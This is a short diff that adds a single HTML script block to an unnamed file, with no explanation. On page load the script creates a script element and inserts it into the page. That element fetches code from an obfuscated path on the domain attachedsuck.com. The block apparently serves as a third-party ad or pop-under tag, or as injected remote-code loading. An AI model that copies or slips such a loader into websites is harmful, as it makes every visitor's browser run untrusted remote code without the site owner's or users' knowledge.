@@ -1,0 +1,12 @@
+<script>
+(function(fppd){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = fppd || {};
+s.src = "\/\/attachedsuck.com\/bVXAV\/s.d\/G\/lJ0tYcW_cy\/me\/ma9suuZ\/UtlOkePITYYO2bMkDEQx3jMNzDQ\/tZNBj\/YrwMNAD\/cWzbNiQR";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
